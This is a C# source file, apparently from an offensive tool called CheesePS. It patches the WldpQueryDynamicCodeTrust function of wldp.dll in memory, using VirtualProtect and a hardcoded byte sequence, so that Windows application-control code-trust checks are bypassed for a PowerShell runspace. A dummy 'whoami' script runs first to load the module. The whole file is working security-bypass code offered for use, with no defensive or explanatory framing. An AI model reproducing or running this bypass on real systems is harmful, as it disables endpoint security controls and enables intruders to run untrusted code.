using System;
using System.Diagnostics;
using System.Management.Automation;
using System.Runtime.InteropServices;
using System.Threading;

namespace CheesePS
{
    internal class WldpBypass
    {
        public static int Patch(string wldpmodule)
        {
            //Get pointer for the wldp.dll        
            var TargetDLL = NativeMethods.GetModuleHandleA(wldpmodule);
            if (TargetDLL == IntPtr.Zero)
            {
                Console.WriteLine($"[-] FAIL: Get Handle to {wldpmodule}");
                return 1;
            }

            //Get pointer for the WldpQueryDynamicCodeTrust function
            var WldpQDTBufrPtr = NativeMethods.GetProcAddress(TargetDLL, "WldpQueryDynamicCodeTrust");
            if (WldpQDTBufrPtr == IntPtr.Zero)
            {
                Console.WriteLine("[-] FAIL: Get Handle to WldpQueryDynamicCodeTrust");
                return 1;
            }

            var dwSize = (UIntPtr)96;
            uint oldProtection;

            if (!NativeMethods.VirtualProtect(WldpQDTBufrPtr, dwSize, 0x40, out oldProtection))
            {
                Console.WriteLine("[-] FAIL: Call to VirtualProtect -> Enable Write");
                return 1;
            }

            byte[] Patch = { 0x44, 0x89, 0x44, 0x24, 0x18, 0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x55, 0x57, 0x48, 0x81, 0xEC, 0xE8, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x6C, 0x24, 0x20, 0x48, 0x8B, 0xFC, 0xB9, 0x3A, 0x00, 0x00, 0x00, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0xF3, 0xAB, 0x48, 0x8B, 0x8C, 0x24, 0x08, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x07, 0xF7, 0x00, 0x00, 0xE8, 0x5C, 0xF7, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x8D, 0xA5, 0xC8, 0x00, 0x00, 0x00, 0x5F, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC };

            Int32 size = (Int32)dwSize;

            var unmanagedPointer = Marshal.AllocHGlobal(size);
            Marshal.Copy(Patch, 0, unmanagedPointer, size);

            NativeMethods.CopyMemory(WldpQDTBufrPtr, unmanagedPointer, size);

            Console.WriteLine("[+] Success. WldpQueryDynamicCodeTrust Patched!");
            Console.WriteLine("[*] Restoring memory protection...");
            uint newProtection;
            if (!NativeMethods.VirtualProtect(WldpQDTBufrPtr, dwSize, oldProtection, out newProtection))
            {
                Console.WriteLine("[-] FAIL: Call to VirtualProtect -> Disable Write");
                return 1;
            }

            return 0;
        }

        private static void ExecuteDummyCode(PowerShell posh)
        {
            var code = "whoami";
            posh.AddScript(code);
            posh.Invoke();
        }

        private static void Test()
        {
        }

        public static bool InvokeBypass(PowerShell posh)
        {
            var proc = Process.GetCurrentProcess();
            Thread.Sleep(1000);

            ExecuteDummyCode(posh);

            foreach (ProcessModule module in proc.Modules)
                if (module.FileName.Contains("wldp.dll"))
                {
                    Console.WriteLine("    [>] Found WLDP Module: {0}", module.FileName);
                    Patch(module.FileName);
                    return true;
                }

            return false;
        }
    }
}